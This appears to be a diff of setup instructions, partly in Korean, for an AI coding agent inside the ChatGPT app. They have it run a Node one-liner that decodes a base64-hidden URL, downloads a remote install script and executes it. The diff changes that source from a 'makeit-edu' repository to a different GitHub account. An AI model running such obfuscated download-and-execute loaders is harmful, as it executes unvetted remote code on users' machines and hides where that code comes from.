@@ -26,7 +26,7 @@
 let fs = await import("node:fs/promises"); let os = await import("node:os"); let path = await import("node:path");
 let 작업폴더 = path.resolve(".");
 let 임시 = await fs.mkdtemp(path.join(os.tmpdir(), "makeit-setup-"));
-let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21ha2VpdC1lZHUvbWFrZWl0LW1pZGRsZS1raXQvbWFpbi8lRUMlOTUlQjEvJUVDJTg0JUE0JUVDJUI5JTk4Lm1qcw==") + "?t=" + Date.now());
+let r = await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbWF5b3VuZ3Bvd2VyLWRvdGNvbS9tYWtlaXQtbWlkZGxlLWtpdC9tYWluLyVFQyU5NSVCMS8lRUMlODQlQTQlRUMlQjklOTgubWpz") + "?t=" + Date.now());
 await fs.writeFile(path.join(임시, "설치.mjs"), await r.text());
 let 결과 = await (await import("file://" + path.join(임시, "설치.mjs") + "?t=" + Date.now())).설치({ 작업폴더 });
 await fs.rm(임시, { recursive: true, force: true });
@@ -40,7 +40,7 @@ nodeRepl.write(JSON.stringify(결과, null, 1));
 macOS:
 
 ```bash
-"/Applications/ChatGPT.app/Contents/Resources/cua_node/bin/node" --input-type=module -e 'let fs=await import("node:fs/promises");let os=await import("node:os");let path=await import("node:path");let 작업폴더=path.resolve(".");let 임시=await fs.mkdtemp(path.join(os.tmpdir(),"makeit-setup-"));let r=await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21ha2VpdC1lZHUvbWFrZWl0LW1pZGRsZS1raXQvbWFpbi8lRUMlOTUlQjEvJUVDJTg0JUE0JUVDJUI5JTk4Lm1qcw==")+"?t="+Date.now());await fs.writeFile(path.join(임시,"설치.mjs"),await r.text());let 결과=await (await import("file://"+path.join(임시,"설치.mjs")+"?t="+Date.now())).설치({작업폴더});await fs.rm(임시,{recursive:true,force:true});console.log(JSON.stringify(결과,null,1));'
+"/Applications/ChatGPT.app/Contents/Resources/cua_node/bin/node" --input-type=module -e 'let fs=await import("node:fs/promises");let os=await import("node:os");let path=await import("node:path");let 작업폴더=path.resolve(".");let 임시=await fs.mkdtemp(path.join(os.tmpdir(),"makeit-setup-"));let r=await fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbWF5b3VuZ3Bvd2VyLWRvdGNvbS9tYWtlaXQtbWlkZGxlLWtpdC9tYWluLyVFQyU5NSVCMS8lRUMlODQlQTQlRUMlQjklOTgubWpz")+"?t="+Date.now());await fs.writeFile(path.join(임시,"설치.mjs"),await r.text());let 결과=await (await import("file://"+path.join(임시,"설치.mjs")+"?t="+Date.now())).설치({작업폴더});await fs.rm(임시,{recursive:true,force:true});console.log(JSON.stringify(결과,null,1));'
 ```
 
 Windows: ChatGPT 앱 설치 폴더 안의 `node.exe` 를 찾아(`Get-ChildItem -Recurse -Filter node.exe "$env:LOCALAPPDATA\Programs\ChatGPT"`) 위와 같은 코드를 실행한다. 못 찾으면 "코덱스가 프로그램을 실행하지 못했어요. ChatGPT 앱을 최신으로 업데이트하고 완전히 껐다 켠 뒤 다시 말해 주세요." 라고만 말해라.
